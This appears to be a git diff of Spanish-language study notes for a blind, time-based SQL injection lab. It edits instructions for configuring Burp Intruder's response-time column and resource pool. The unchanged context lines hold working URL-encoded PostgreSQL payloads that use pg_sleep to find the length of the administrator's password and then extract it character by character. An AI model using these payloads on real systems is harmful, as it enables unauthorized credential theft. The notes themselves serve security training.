@@ -66,7 +66,7 @@ Por el Orden de ejecucion
 # Extraer los datos Paso 3
 
 Sabiendo que tienemos un password utilizamos el LENGTH() vas mandando al intruder esta peticion cuando la mandes en la pesataña de comumnas activa en donde dice
-recived para ver el tiempo que tardo en recibirse para ver donde cambia.
+****Response recived*** para ver el tiempo que tardo en recibirse para ver donde cambia.
 
 ```
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
@@ -79,7 +79,7 @@ Para confirmar nada mas
 
 ```
 
-Para sacar el password que mide 20  mover la posicion del substring moviendo hasta el 20 igual activa la opcion de recived para ver el tiempo en que se tardo y ademas activa que solo se genere una solicitud en burp en el resource pool
+Para sacar el password que mide 20  mover la posicion del substring moviendo hasta el 20 igual activa la opcion de recived para ver el tiempo en que se tardo y ademas activa que solo se genere una solicitud en burp en el ***Resource pool*** dentro de las opciones del intruder ( max 1 request)
 
 ```
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
